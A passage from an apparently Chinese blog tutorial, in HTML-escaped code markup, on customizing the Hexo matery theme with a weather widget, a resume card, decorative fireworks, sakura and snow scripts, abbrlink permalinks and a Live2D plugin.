string&quot;&gt;&quot;left&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; x&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n            &lt;span class=&quot;token string&quot;&gt;&quot;position&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;absolute&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n            &lt;span class=&quot;token string&quot;&gt;&quot;font-weight&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n            &lt;span class=&quot;token string&quot;&gt;&quot;color&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;#FF0000&quot;&lt;/span&gt;\n        &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n        &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;body&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;$i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n        $i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;animate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt;\n                &lt;span class=&quot;token string&quot;&gt;&quot;top&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; y &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;180&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n                &lt;span class=&quot;token string&quot;&gt;&quot;opacity&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;\n            &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n            &lt;span class=&quot;token number&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;\n            &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt;\n                $i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n            &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n    &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n    &lt;span class=&quot;token function&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;delay()&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n&lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n\n&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt;\n    &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;.buryit&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;removeAttr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;onclick&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n&lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n## [](#添加天气小插件 &quot;添加天气小插件&quot;)添加天气小插件\n\n首先去中国天气官网：[[https://cj.weather.com.cn/plugin/pc，](https://cj.weather.com.cn/plugin/pc，)\n\n[配置自己的插件，选择自定义插件—&amp;gt;自定义样式——&amp;gt;生成代码，然后会生成一段代码，复制粘贴到`themes/matery/layout/layout.ejs`即可。\n\n## [](#关于我页面添加个人简历 &quot;关于我页面添加个人简历&quot;)关于我页面添加个人简历\n\n打开`theme/matery/layout/about.ejs`文件，大约在13行。有一个``标签，找出其对应结尾的标签，大约在61行左右，然后在新增如下代码：\n\n&lt;pre class=&quot;line-numbers language-html&quot;&gt;`&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n     &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card-content&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card-content article-card-content&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n             &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;title center-align&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;data-aos&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;zoom-in-up&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n                 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;i&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;fa fa-address-book&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;i&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token entity&quot; title=&quot;&amp;nbsp;&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span class=&quot;token entity&quot; title=&quot;&amp;nbsp;&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;%-&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;__(&#39;个人简历&#39;)&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n              &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n                 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;articleContent&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;data-aos&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;fade-up&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n                     &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;%-&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;page.content&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n                 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n           &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n注意粘贴的位置和空格要正确，这里的位置随你自己设置，你也可以把简历作为第一个card，然后`/source/about/index.md`下面写上你的简历了（就像写博客一样）。\n\n## [](#添加鼠标点击烟花爆炸效果 &quot;添加鼠标点击烟花爆炸效果&quot;)添加鼠标点击烟花爆炸效果\n\n效果：\n\n![2](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210735.gif)\n\n首先在`themes/matery/source/js`目录下新建`fireworks.js`文件，打开这个网址[传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fbaifeng66%2Fcdn%401.1%2Fsource%2Fjs%2Ffireworks.js)，将内容复制粘贴到`fireworks.js`即可。\n\n然后再`themes/matery/layout/layout.ejs`文件内添加下面的内容：\n\n&lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;canvas &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;fireworks&quot;&lt;/span&gt; style&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;canvas&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; \n&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; \n&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/js/fireworks.js&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n然后`hexo clean &amp;amp;&amp;amp; hexo g &amp;amp;&amp;amp; hexo s`即可，就可以看到效果了。\n\n## [](#添加樱花飘落效果 &quot;添加樱花飘落效果&quot;)添加樱花飘落效果\n\n在`themes/matery/source/js`目录下新建`sakura.js`文件，打开这个网址[传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fbaifeng66%2Fcdn%401.1%2Fsource%2Fjs%2Fsakura.js)，将内容复制粘贴到sakura.js即可。\n\n然后再`themes/matery/layout/layout.ejs`文件内添加下面的内容：\n\n&lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;\n&lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;//只在桌面版网页启用特效&lt;/span&gt;\n&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; windowWidth &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;window&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;windowWidth &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;768&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt;\n    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;&amp;lt;script type=&quot;text/javascript&quot; src=&quot;/js/sakura.js&quot;&gt;&amp;lt;\\/script&gt;&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;\n&lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;\n&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n## [](#添加鼠标彩虹星星掉落跟随效果 &quot;添加鼠标彩虹星星掉落跟随效果&quot;)添加鼠标彩虹星星掉落跟随效果\n\n在`themes/matery/source/js`目录下新建`cursor.js`文件，打开这个网址[传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fbaifeng66%2Fcdn%401.1%2Fsource%2Fjs%2Fcursor.js)，将内容复制粘贴到cursor.js即可。\n\n然后再`themes/matery/layout/layout.ejs`文件内添加下面的内容：\n\n&lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/js/cursor.js&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n## [](#添加雪花飘落效果 &quot;添加雪花飘落效果&quot;)添加雪花飘落效果\n\n在`themes/matery/source/js`目录下新建`snow.js`文件，打开这个网址[传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fbaifeng66%2Fcdn%401.1%2Fsource%2Fjs%2Fsnow.js)，将内容复制粘贴到cursor.js即可。\n\n然后再`themes/matery/layout/layout.ejs`文件内添加下面的内容：\n\n&lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/js/snow.js&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n## [](#文章生成永久链接 &quot;文章生成永久链接&quot;)文章生成永久链接\n\n主题默认的文章链接配置是\n\n&lt;pre class=&quot;line-numbers language-yaml&quot;&gt;`&lt;span class=&quot;token key atrule&quot;&gt;permalink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;year/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;month/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;day/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;title&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n这种生成的链接地址很长，文章版权的链接地址会出现一大串字符编码，一点也不好看。因此需要修改文章生成链接的格式。\n\n**注：设置之后之前的文章评论就没了**\n\n首先再根目录下执行下面的命令：\n\n&lt;pre class=&quot;line-numbers language-bash&quot;&gt;`&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; hexo-abbrlink --save&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n然后再站点配置文件下添加如下配置：\n\n&lt;pre class=&quot;line-numbers language-yaml&quot;&gt;`&lt;span class=&quot;token key atrule&quot;&gt;abbrlink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;\n    &lt;span class=&quot;token key atrule&quot;&gt;alg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; crc16   &lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;#算法： crc16(default) and crc32&lt;/span&gt;\n    &lt;span class=&quot;token key atrule&quot;&gt;rep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; hex     &lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;#进制： dec(default) and hex: dec #输出进制：十进制和十六进制，默认为10进制。丨dec为十进制，hex为十六进制&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n再将站点配置文件的`permalink`的值修改为：\n\n&lt;pre class=&quot;line-numbers language-yaml&quot;&gt;`&lt;span class=&quot;token key atrule&quot;&gt;permalink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; posts/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;abbrlink.html  &lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;# 此处可以自己设置，也可以直接使用 :/abbrlink&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt;\n\n生成完后，原md文件的Front-matter 内会增加`abbrlink` 字段，值为生成的ID 。这个字段确保了在我们修改了`Front-matter` 内的博客标题title或创建日期date字段之后而不会改变链接地址。\n\n## [](#添加Live2d看板娘 &quot;添加Live2d看板娘&quot;)添加Live2d看板娘\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814211201.png)\n\n插件：hexo-helper-live2d\ngithub仓库：[https://github.com/EYHN/hexo-helper-live2d](https://github.com/EYHN/hexo-helper-live2d)**\n\n### [](#1-安装插件 &quot;1.安装插件&quot;)1.安装插件\n\n运行命令`npm install --save hexo-helper-live2d`\n\n### [](#2-选择模型 &quot;2.选择模型&quot;)2.选择模型\n\n**可到 [https://huaji8.top/post/live2d-plugin-2.0/](https://huaji8.top/post/live2d-plugin-2.0/) 预览效果。**\n\n**命令为:`npm install live2d-widget-model-模型名`，模型为可参考上面的预览内容。**\n\n### [](#3-配置 &quot;3.配置&quot;)3.配置\n\n站点更目录的配置文件`_config.yml`或者是主题的配置文件中添加：\n\n&lt;pre&gt;`# Live2D\n## https://github.com/EYHN/hexo-helper-live2d\nlive2d:\n  enable: true\n  